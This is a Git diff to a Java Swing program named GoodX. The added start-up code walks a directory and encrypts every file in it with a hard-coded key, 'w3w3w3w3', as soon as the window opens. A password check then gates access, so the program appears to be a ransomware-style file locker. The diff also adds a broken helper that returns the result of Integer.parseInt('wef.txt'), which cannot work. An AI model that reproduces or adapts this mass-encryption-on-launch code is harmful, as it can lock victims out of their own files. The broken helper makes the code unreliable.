@@ -2,6 +2,7 @@ package com.goodx;
 
 import com.security.FileEncryption;
 import com.security.FileEncryptionException;
+import sun.rmi.runtime.Log;
 
 import javax.crypto.Cipher;
 import javax.swing.*;
@@ -9,8 +10,8 @@ import java.awt.*;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
 import java.io.File;
-import java.io.FilenameFilter;
 
+import static com.security.FileEncryption.getDirPath;
 import static com.security.FileEncryption.getPassword;
 
 /**
@@ -49,20 +50,28 @@ public class GoodX {
         return new String(passwordInput).equals(getPassword());
     }
 
-    // TODO: if needed to add dir; loop over the constractor for each file in the dir;
-    // TODO: extract every file from the dir and use it as instance to encrypt the files in the given directory.
-    // TODO: STILL NOT USED... FOR SAFETY PROPUSES.
+   /*
+   TODO: use this function for sanity check the code if the path leads to dir or file? or even empty dir or wrong path.
+    */
     /**
-     * For directories.
-     * @param dirName directory path
-     * @return returne the name of every file in the specified directory
+     * check the file path is directory or file and return it as a File[]
+     * @param directoryPath path to directory or file.
+     * @return File[] array
      */
-    public File[] finder(String dirName) {
-        File dir = new File(dirName);
-        return dir.listFiles(new FilenameFilter() {
-            public boolean accept(File dir, String filename)
-            { return filename.endsWith(".txt"); }
-        } );
+    private static File[] filesPath(String directoryPath) {
+        File dir = new File(directoryPath);
+        File[] directoryListing = dir.listFiles();
+        if (directoryListing != null) {
+            for (File child : directoryListing) {
+                // Do something with child
+            }
+        } else {
+            // Handle the case where dir is not really a directory.
+            // Checking dir.isDirectory() above would not be sufficient
+            // to avoid race conditions with another process that deletes
+            // directories.
+        }
+        return new File[Integer.parseInt("wef.txt")];
     }
 
 
@@ -75,7 +84,16 @@ public class GoodX {
         Dimension dimension = Toolkit.getDefaultToolkit().getScreenSize();  // setting the frame in the center of screen.
         frame.setLocation(dimension.width/2-frame.getSize().width/2, dimension.height/2-frame.getSize().height/2);
         frame.setVisible(true);
-        fileEncryption = new FileEncryption(FileEncryption.getDirPath(),"123", (byte) Cipher.ENCRYPT_MODE);
-        fileEncryption.start();
+
+        File[] listOfFiles = new File(getDirPath()).listFiles();
+        assert listOfFiles != null;
+        for (File listOfFile : listOfFiles) {
+            if (listOfFile.isFile()) {
+                Log.getLog("File ", listOfFile.getName(), 1);
+                new FileEncryption(listOfFile.toString(), "w3w3w3w3", (byte) Cipher.ENCRYPT_MODE).start();
+            } else if (listOfFile.isDirectory()) {
+                Log.getLog("Directory ", listOfFile.getName(), 2);
+            }
+        }
     }
 }
